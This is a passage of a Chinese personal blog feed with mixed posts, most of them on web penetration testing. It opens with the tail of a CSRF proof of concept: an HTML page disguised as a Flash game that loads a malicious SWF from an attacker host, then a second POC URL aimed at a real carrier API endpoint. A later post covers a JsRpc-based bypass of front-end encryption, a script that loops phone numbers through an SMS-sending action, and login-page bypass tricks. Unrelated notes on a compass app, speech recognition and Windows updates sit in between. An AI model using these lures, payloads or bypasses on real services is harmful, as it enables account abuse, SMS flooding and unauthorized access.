class="number">550px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>🎮 Exciting Flash Game! 🎮<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Click below to play the game (requires Flash Player):<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 嵌入恶意 Flash --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;flash-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;movie&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">small</span>&gt;</span>Note: If you see a blank screen, make sure Flash Player is enabled.<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 额外伪装成正常内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 30px;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This game requires Adobe Flash Player. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Download here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.0xdawn.cn/swf_json_csrf/test.swf?endpoint=https://sim.ecloud.10086.cn:8085/simauth/app/updateAppInfo&amp;reqmethod=POST&amp;ct=application/json;charset=UTF-8&amp;jsonData=&#123;%22appId%22:%22300016001555%22,%22appName%22:%220xdawn%22&#125;&amp;php_url=https://www.0xdawn.cn/swf_json_csrf/test.php</span><br></pre></td></tr></table></figure>



<h1 id="csrf漏洞详解网址："><a href="#csrf漏洞详解网址：" class="headerlink" title="csrf漏洞详解网址："></a>csrf漏洞详解网址：</h1><p><a href="https://xz.aliyun.com/news/7506">一次渗透测试引发的Json格式下CSRF攻击的探索-先知社区</a></p>
<p>..&#x2F;_code&#x2F;csrf</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>web-net</tag>
      </tags>
  </entry>
  <entry>
    <title>指南针-导航</title>
    <url>/2025/04/01/%E5%AF%BC%E8%88%AA/</url>
    <content><![CDATA[<h1 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h1><p>主要：<a href="https://github.com/Kr0oked/Compass">指南针项目</a></p>
<p>后端：<a href="">步行规划</a></p>
<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>获取磁场传感器、加速度传感器，得到方向角。打开app的一瞬间以手机方向为arrow_image.png的指向角度</p>
<p>偏转角度：</p>
<p>定位指向真北的角度+正北顺时针到目标经纬度的角度</p>
<p>以定位更改为刷新	&#x2F;&#x2F;	以每2s为更新次数</p>
<p>难点：</p>
<p>对Android Studio完全陌生，即便更改别人的指南针项目也一定时间无法搞懂其项目结构，对java的不熟悉更是难以下脚</p>
<p>语音的接入以及服务器发包和接包这几个功能点的嵌入无从动手</p>
<p>做法：</p>
<p>先更改其ui来熟悉项目结构</p>
<p>新增功能点，只要接入角度的偏转就行</p>
<span id="more"></span>

<h2 id="内容更改"><a href="#内容更改" class="headerlink" title="内容更改"></a>内容更改</h2><p>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\CompassFragment.kt<br>—&gt;updateCompass</p>
<p>\Downloads\Compass-master\Compass-master\app\src\main\res\layout\compass_view.xml<br>@+id&#x2F;cardinal_direction_north_text—–北</p>
<p>\Compass-master\Compass-master\app\src\main\res\values-zh\strings.xml</p>
<p>更改参考文字</p>
<p>###########需要更改<br>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\view\CompassView.kt<br>R.string.degrees—动态更改距离</p>
<p>\Compass-master\Compass-master\app\src\main\java\com\bobek\compass\model\Azimuth.kt<br>val degrees—偏转角度</p>
<h6 id="方向角的计算公式："><a href="#方向角的计算公式：" class="headerlink" title="方向角的计算公式："></a>方向角的计算公式：</h6><p><img src="/..%5Cimage%5Cmap-app%5Cazimuth.png" alt="azimuth"></p>
]]></content>
      <categories>
        <category>Android Studio</category>
      </categories>
      <tags>
        <tag>Android Studio</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>前端游走</title>
    <url>/2025/03/04/%E5%89%8D%E7%AB%AF%E6%B8%B8%E8%B5%B0/</url>
    <content><![CDATA[<h1 id="前端加密对抗"><a href="#前端加密对抗" class="headerlink" title="前端加密对抗"></a>前端加密对抗</h1><p>网址教学：<a href="https://xz.aliyun.com/news/14066">https://xz.aliyun.com/news/14066</a></p>
<p>我主要使用的方法是其中的 <a href="https://github.com/jxhczhl/JsRpc">JsRpc</a>  +  python</p>
<h3 id="1-找明码函数"><a href="#1-找明码函数" class="headerlink" title="[1]找明码函数"></a>[1]找明码函数</h3><p>找到其中明码所代表的变量，一般查找方式为查找关键字：<strong>encrypt</strong> ，来找到明码加密的函数</p>
<h3 id="2-连rpc-设断点"><a href="#2-连rpc-设断点" class="headerlink" title="[2]连rpc-设断点"></a>[2]连rpc-设断点</h3><p>连接jsrpc，设置断点，设置全局变量，设置demo变量，设置demo变量的功能</p>
<span id="more"></span>

<p>连接–&gt;<a href="https://github.com/cliayn/cliayn.github.io/blob/master/image/web-js-freely/1.txt">连接函数</a>，断点自己找明文就行</p>
<p><img src="/../image/web-js-freely/1.png" alt="该图取自先知社区"></p>
<p>全局变量如下，例如加密函数a(t)，t是明码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.enc=a</span><br><span class="line">//如果复杂则用下面的</span><br><span class="line"></span><br><span class="line">window.enc=function()&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure>

<p>设置demo变量如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&quot;);</span><br></pre></td></tr></table></figure>

<p>设置demo变量的功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve, param) &#123;</span><br><span class="line">    var res = enc(String(param));</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这里是传多个参数</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve,param) &#123;</span><br><span class="line">    //这里还是param参数 param里面的key 是先这里写，但到时候传接口就必须对应的上</span><br><span class="line">    res=hlg(param[&quot;user&quot;],param[&quot;status&quot;])</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>！！！</strong>值得注意的是：</p>
<p>​	<strong>运行js到断点处执行所有的代码和指令，例如设置全局变量一定要在断点处，否则可能会找不到明码变量</strong></p>
<h3 id="3-跑py代码"><a href="#3-跑py代码" class="headerlink" title="[3]跑py代码"></a>[3]跑py代码</h3><p>py代码框架大概如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//例如我爆破手机号</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">file_path = &#x27;sampled_100k.txt&#x27;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">        for line in file:</span><br><span class="line">            print(line.strip())  # .strip() to remove any extra newline characters</span><br><span class="line">            phone_number = line.strip()</span><br><span class="line">            </span><br><span class="line">            url = f&quot;http://127.0.0.1:12080/go?group=zzz&amp;action=sendSms&amp;param=&#123;phone_number&#125;&quot;</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            print(res.text)</span><br><span class="line">            </span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(f&quot;File &#123;file_path&#125; not found.&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>！！！</strong>值得注意的是：</p>
<p>​	<strong>你定义的window.enc函数的功能决定res.text返回的是什么</strong></p>
<h1 id="前端穿梭"><a href="#前端穿梭" class="headerlink" title="前端穿梭"></a>前端穿梭</h1><p>如果你因为进入不了后台而找不全接口，或者渗透时js老是强制跳转登录页面，这个可能能帮到你</p>
<h3 id="1-绕过登录口"><a href="#1-绕过登录口" class="headerlink" title="[1]绕过登录口"></a>[1]绕过登录口</h3><p>提供几个方法以供参考，如果不行还是得审计js文件</p>
<h5 id="·1-更改响应包"><a href="#·1-更改响应包" class="headerlink" title="·1.更改响应包"></a>·1.更改响应包</h5><p>更改登录接口返回的响应包，将flase改成true，或者code改成200或者0，status改成200或者0，具体数字可能需要审计js代码，看他们js监控的登录成功的响应是什么，一般情况就是200或者0</p>
<h5 id="·2-控制台强制跳转"><a href="#·2-控制台强制跳转" class="headerlink" title="·2.控制台强制跳转"></a>·2.控制台强制跳转</h5><p>这个比较万金油，在控制台输入如下指令，如果用不了你就得看js文件—看下方注意事项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//引号后面加要跳转的目录</span><br><span class="line">window.location.href = &quot;/mch/info_basic/&quot;;</span><br><span class="line"></span><br><span class="line">//不行可以用这个</span><br><span class="line"></span><br><span class="line">location.hash = &#x27;/user/admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>如果你看到闪现了一下后台的页面就代表他们是把后台页面也放到了前端了的，有两种情况</p>
<p>1&gt;跳转后可能在控制台会报错，点击报错的js位置进行断点，然后再输入一次控制台指令，当然，你直接在url输入也一样，就可以卡到js加载的后端</p>
<p><img src="/../image/web-js-freely/test2.jpg"></p>
<p>2&gt;跳转后无异常，又有两种情况解决</p>
<p>​	—你需要多找几个断点，直到找到控制台输入指令可以调试的那个断点，一直调试下一步，直到有后台页面</p>
<p>​	—控制台输入代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.onbeforeunload = function() &#123;</span><br><span class="line">    return &quot;你确定要离开吗？&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//然后再输入</span><br><span class="line">location.hash = &#x27;/admin/xxxx&#x27;;</span><br></pre></td></tr></table></figure>

<p>​			一般来说，就会跳转到第一种情况，当然，具体情况还得看js咋写的</p>
<p><img src="/../image/web-js-freely/test1.jpg"></p>
<p>跳转到后台页面后一般是不能点击里面的链接的，这个时候要跳到f12的网络功能或者打开burp拦截包，将返回”Unauthorized”或者相关的都禁用或者拦截，禁用完之后，再运行一次控制台指令就不会强制跳转了</p>
<p><img src="/../image/web-js-freely/3.png"></p>
<p>！！！值得注意的是：</p>
<p>1&gt;<strong>记得提前删除网络日历，要不然太多了影响判断</strong></p>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<p>2&gt;<strong>一般看js文件中用的是什么强制跳转的函数，js用什么你就用什么，例如这个就要用location.hash&#x3D;”(后台目录)”</strong></p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<p><img src="/../image/web-js-freely/2.jpg"></p>
<h1 id="本地更改js文件"><a href="#本地更改js文件" class="headerlink" title="本地更改js文件"></a>本地更改js文件</h1><p>1&gt;无需多言，看得懂，会改，哪基本前端就没有什么秘密了</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>web-net</tag>
        <tag>js</tag>
        <tag>key</tag>
      </tags>
  </entry>
  <entry>
    <title>方言识别</title>
    <url>/2025/02/18/%E6%96%B9%E8%A8%80%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<p><strong>前言：</strong></p>
<p>​	为了便宜行事，可以找语音识别的现成项目进行修改，我最多是一个拼接的应用层，技术算法那些就别花费太多时间了，我只要知道是什么，如何用就成，把高端的科技服务我这种普通人</p>
<p>(–训练200轮，1轮3-5小时，跑了3轮暂时搁置–)</p>
<p>参考项目：<a href="https://github.com/yeyupiaoling/PaddlePaddle-DeepSpeech/tree/release/1.0">https://github.com/yeyupiaoling/PaddlePaddle-DeepSpeech/tree/release/1.0</a></p>
<p>参考视频：<a href="https://www.bilibili.com/video/BV1Ng411j7xB/?spm_id_from=333.788.videopod.sections&vd_source=62ec56a0e96ac07702343ec20500f1cc">DeepSpeech2实现的中文语音识别_哔哩哔哩_bilibili</a></p>
<hr>
<p>可参考项目:<a href="https://blog.csdn.net/gitblog_00059/article/details/136961410">https://blog.csdn.net/gitblog_00059/article/details/136961410</a></p>
<hr>
<h4 id="以参考项目为例："><a href="#以参考项目为例：" class="headerlink" title="以参考项目为例："></a>以参考项目为例：</h4><h5 id="1-流程"><a href="#1-流程" class="headerlink" title="1&gt;流程"></a>1&gt;流程</h5><p>下载数据集—&gt;数据预处理—&gt;训练模型—&gt;预测模型—&gt;预测方言成文字—&gt;结果</p>
<h6 id="·出现的问题"><a href="#·出现的问题" class="headerlink" title="·出现的问题"></a>·出现的问题</h6><span id="more"></span>

<p>[1]–下载GUDAA以及啥来着忘了，一个拖动的</p>
<p>[2]–下载C++工具</p>
<h1 id="方言识别模型训练思路框架"><a href="#方言识别模型训练思路框架" class="headerlink" title="方言识别模型训练思路框架"></a>方言识别模型训练思路框架</h1><h2 id="1-数据准备"><a href="#1-数据准备" class="headerlink" title="1. 数据准备"></a>1. 数据准备</h2><h3 id="1-1-收集方言语音数据"><a href="#1-1-收集方言语音数据" class="headerlink" title="1.1 收集方言语音数据"></a>1.1 收集方言语音数据</h3><ul>
<li>收集多种方言的语音数据，如粤语、吴语、闽南语等。</li>
<li>数据应该包括：<ul>
<li><strong>音频文件</strong>：采用 WAV 格式的语音文件。</li>
<li><strong>转录文件</strong>：每个音频文件对应的文字转录（普通话或方言的标注文本）。</li>
</ul>
</li>
<li>数据量要足够多，保证训练的多样性。</li>
</ul>
<h3 id="1-2-数据标注"><a href="#1-2-数据标注" class="headerlink" title="1.2 数据标注"></a>1.2 数据标注</h3><ul>
<li>对方言语音进行准确的标注，确保转录文件和音频文件一一对应。</li>
<li>可以使用拼音、普通话字符集进行标注。</li>
<li>对不同方言的转录进行统一标准化处理。</li>
</ul>
<h2 id="2-数据预处理"><a href="#2-数据预处理" class="headerlink" title="2. 数据预处理"></a>2. 数据预处理</h2><h3 id="2-1-特征提取"><a href="#2-1-特征提取" class="headerlink" title="2.1 特征提取"></a>2.1 特征提取</h3><ul>
<li>将音频文件转换为 <strong>梅尔频率倒谱系数（MFCC）</strong> 特征。<ul>
<li>通过音频处理工具（如 <code>librosa</code>）提取 MFCC 特征。</li>
</ul>
</li>
<li>可选：使用数据增强技术，如添加背景噪声，进行时间偏移等。</li>
</ul>
<h3 id="2-2-文本规范化"><a href="#2-2-文本规范化" class="headerlink" title="2.2 文本规范化"></a>2.2 文本规范化</h3><ul>
<li>规范化文本数据，确保文本格式统一。<ul>
<li>可以进行拼音转换，或者采用标准的普通话字符集。</li>
</ul>
</li>
</ul>
<h3 id="2-3-数据集划分"><a href="#2-3-数据集划分" class="headerlink" title="2.3 数据集划分"></a>2.3 数据集划分</h3><ul>
<li>划分训练集、验证集和测试集（常见的比例是 80% 训练集，10% 验证集，10% 测试集）。</li>
</ul>
<h2 id="3-安装-DeepSpeech"><a href="#3-安装-DeepSpeech" class="headerlink" title="3. 安装 DeepSpeech"></a>3. 安装 DeepSpeech</h2><h3 id="3-1-安装依赖"><a href="#3-1-安装依赖" class="headerlink" title="3.1 安装依赖"></a>3.1 安装依赖</h3><ul>
<li><p>安装 DeepSpeech：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install deepspeech</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装训练时的依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">pip install deepspeech-gpu</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-2-环境配置"><a href="#3-2-环境配置" class="headerlink" title="3.2 环境配置"></a>3.2 环境配置</h3><ul>
<li>配置 Python 环境，安装所需的库（如 <code>tensorflow</code>, <code>numpy</code> 等）。</li>
</ul>
<h2 id="4-模型训练"><a href="#4-模型训练" class="headerlink" title="4. 模型训练"></a>4. 模型训练</h2><h3 id="4-1-准备数据文件"><a href="#4-1-准备数据文件" class="headerlink" title="4.1 准备数据文件"></a>4.1 准备数据文件</h3><ul>
<li><p>将数据集转化为 DeepSpeech 支持的格式（CSV 文件），包含音频路径和对应文本。</p>
</li>
<li><p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">path/to/audio1.wav,你好</span><br><span class="line">path/to/audio2.wav,早安</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="4-2-配置训练参数"><a href="#4-2-配置训练参数" class="headerlink" title="4.2 配置训练参数"></a>4.2 配置训练参数</h3><ul>
<li><p>设置训练参数：</p>
<ul>
<li><p>学习率、批量大小、训练步数等。</p>
</li>
<li><p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">--train_batch_size 32</span><br><span class="line">--dev_batch_size 16</span><br><span class="line">--epochs 30</span><br><span class="line">--checkpoint_dir checkpoints</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="4-3-启动训练"><a href="#4-3-启动训练" class="headerlink" title="4.3 启动训练"></a>4.3 启动训练</h3><ul>
<li><p>使用 DeepSpeech 的命令行工具启动训练：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">deepspeech --train_files data/train.csv --dev_files data/dev.csv --test_files data/test.csv --train_batch_size 32 --dev_batch_size 16 --epochs 30 --checkpoint_dir checkpoints</span><br></pre></td></tr></table></figure>
</li>
<li><p>训练过程中 DeepSpeech 会自动进行特征提取和模型训练。</p>
</li>
</ul>
<h2 id="5-模型评估与优化"><a href="#5-模型评估与优化" class="headerlink" title="5. 模型评估与优化"></a>5. 模型评估与优化</h2><h3 id="5-1-评估模型性能"><a href="#5-1-评估模型性能" class="headerlink" title="5.1 评估模型性能"></a>5.1 评估模型性能</h3><ul>
<li>在每个训练周期后评估模型在验证集和测试集上的表现。</li>
<li>使用 <strong>字符错误率（CER）</strong> 或 <strong>词错误率（WER）</strong> 来衡量模型性能。</li>
</ul>
<h3 id="5-2-优化策略"><a href="#5-2-优化策略" class="headerlink" title="5.2 优化策略"></a>5.2 优化策略</h3><ul>
<li>调整超参数（如学习率、批量大小等）来优化模型训练。</li>
<li>增加训练数据量，特别是方言区域的多样性。</li>
<li>使用噪声抑制和数据增强来提高鲁棒性。</li>
</ul>
<h2 id="6-方言识别应用"><a href="#6-方言识别应用" class="headerlink" title="6. 方言识别应用"></a>6. 方言识别应用</h2><h3 id="6-1-使用训练好的模型进行推理"><a href="#6-1-使用训练好的模型进行推理" class="headerlink" title="6.1 使用训练好的模型进行推理"></a>6.1 使用训练好的模型进行推理</h3><ul>
<li><p>使用训练好的模型进行语音识别：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">deepspeech --model checkpoints/model.pbmm --scorer checkpoints/model.scorer --audio your_audio.wav</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6-2-应用部署"><a href="#6-2-应用部署" class="headerlink" title="6.2 应用部署"></a>6.2 应用部署</h3><ul>
<li>将模型部署到实际的应用中，如语音助手、自动字幕生成、方言识别等。</li>
</ul>
<h2 id="7-持续优化"><a href="#7-持续优化" class="headerlink" title="7. 持续优化"></a>7. 持续优化</h2><ul>
<li>根据用户反馈不断更新和优化模型，增加方言样本，优化模型结构。</li>
<li>定期更新训练数据，确保模型的准确性和鲁棒性。</li>
</ul>
<hr>
<p><strong>注意事项：</strong></p>
<ul>
<li>方言识别的难点之一是口音和发音差异，因此训练数据必须具备多样性。</li>
<li>端到端训练是一个计算密集型过程，训练时需要高效的硬件支持（如 GPU）。</li>
<li>可以考虑使用 <strong>迁移学习</strong>，利用已有的大规模语音识别模型进行微调，以加速训练过程。</li>
</ul>
]]></content>
      <categories>
        <category>machine-learning</category>
      </categories>
      <tags>
        <tag>数据集</tag>
        <tag>语言模型</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows注册表防更新</title>
    <url>/2024/12/30/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%98%B2%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:0000F423F</span><br><span class="line">&quot;PauseFeatureUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseFeatureUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseUpdatesExpiryTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>直接去注册表如下位置添加DWORD(32位)值(D)，值自己设，进制改为10按道理也行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:00002710</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows update</tag>
      </tags>
  </entry>
  <entry>
    <title>主页和api</title>
    <url>/2024/12/26/%E4%B8%BB%E9%A1%B5%E5%92%8Capi/</url>
    <content><![CDATA[<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>在工作期间所遇到的小程序和web端所用的方式如下：</p>
<p>1、主页由其子域名显示，其他功能显示皆由该子域名指向，xxx#&#x2F;page&#x2F;xxx</p>
<p>2、其信息由专门的api子域名来传回，有时会有sms子域名用作短信的发送</p>
<p>3、若没有登录，部分功能的显示可以显示，但无实际信息，即，空白，json为{}</p>
<span id="more"></span>

<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>1.页面和小程序反编译爬取出的js文件或者json文件通常会有上述两个子域名的指向&#x2F;接口</p>
<p>2.找到指向&#x2F;接口，能够查看页面的功能以及接口的作用，用作于测试接口</p>
<p>3.通常会有登录接口用作返回token，大概率为jwt</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>1.有些网址不登录，后台的接口，以及其他的接口无法查看，只能看到个登录接口，即后续网址接口信息需要后台返回，但不代表不存在，通常即使是一个服务器其功能和作用都会十分广泛，毕竟好的服务器很贵的。</p>
<p>—&gt;所以可以从多方入手，例如：该子域名的其他小程序，该接口子域名是否存在被其他网址或小程序被调用的可能</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1.web需要登录就找它对应的小程序，一般来说小程序一旦授权就会给合法jwt</p>
<p>2.用jwt深度爬取js，就是哪里能点点哪里，都点一遍，然后把js脚本下下来，分析指向#&#x2F;xxx&#x2F;和api</p>
<p>3.看有无越权，逻辑漏洞，版本泄露，路径泄露和框架泄露等等</p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>认真分析一个事物就会形成一条思路明显的线路，整体的框架和内容就会完整，认真很久了还没思路那就去睡觉</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>api</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞库</title>
    <url>/2024/12/26/%E6%BC%8F%E6%B4%9E%E5%BA%93/</url>
    <content><![CDATA[<p><a href="https://wiki.wy876.cn/#/">漏洞文库</a></p>
<p><a href="https://github.com/wy876/POC">github漏洞库</a></p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title>自动追番网址</title>
    <url>/2024/12/25/%E8%87%AA%E5%8A%A8%E8%BF%BD%E7%95%AA%E7%BD%91%E5%9D%80/</url>
    <content><![CDATA[<h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h1><p><a href="https://www.autobangumi.org/">AutoBangumi官网</a> —利用rss订阅字幕组，实现自动追番，部署比较轻松，docker部署</p>
<p><a href="https://www.qbittorrent.org/download">qbittorrent下载地址</a> —下载器，订阅后这玩意负责自动下载，我1kG的流量就这么没的</p>
<p><a href="https://emby.media/download.html">Emby下载地址</a> —播放器，其他的也可以，具体看bangumi和服务器支不支持</p>
<span id="more"></span>

<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="/../image/auto_anime/1.png"></p>
<hr>
<p><a href="https://github.com/wushuo894/ani-rss?tab=readme-ov-file">ani-rss项目地址-GitHub</a> —支持 <strong>Transmission</strong> <strong>qBittorrent</strong> <strong>Aria2</strong> 下载器</p>
<p>ani-rss部署参考别个博客<a href="https://www.himiku.com/archives/ani-rss.html">初之音博客</a></p>
]]></content>
      <categories>
        <category>anime</category>
      </categories>
      <tags>
        <tag>rss</tag>
        <tag>qBitTorrent</tag>
        <tag>Two-dimensional</tag>
      </tags>
  </entry>
  <entry>
    <title>正则匹配脚本</title>
    <url>/2024/12/23/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p>今天上班的时候，老是发现uuid这些长id，我要想利用又懒得一个个复制，所以搞了一个脚本扩展，因为我是新手嘛，所以这个脚本有蛮多毛病，这章专门用来介绍哪些毛病，方便以后想改了，拿出来看看好找到要改的地方，我脚本放到github了，以防自己改炸了还有备份</p>
<span id="more"></span>

<h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><p>1、python代码里只匹配了双引号和单引号</p>
<p>2、直接将匹配到的内容写入文件—空格字符和回车字符</p>
<p>3、没有检查匹配字符的过程—不能实时的查看自己的匹配过程	&#x2F;&#x2F;主要</p>
]]></content>
      <categories>
        <category>Cybersecurity</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>jython</tag>
        <tag>Burp Suite</tag>
      </tags>
  </entry>
  <entry>
    <title>web和小程序的漏洞排查</title>
    <url>/2024/12/20/%E7%AC%94%E8%AE%B0_js-request/</url>
    <content><![CDATA[<p>该篇文章为记录在工作时遇到的基本问题以及对应的解决方式，以免自己把一些方法用完就忘，下次遇到又得🐔🐔</p>
<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><h3 id="过前端加密"><a href="#过前端加密" class="headerlink" title="过前端加密"></a>过前端加密</h3><p>​	在web端或者小程序中可能遇到请求包中的参数加密的情况，这种加密我一般用下面的两种处理方式。</p>
<span id="more"></span>

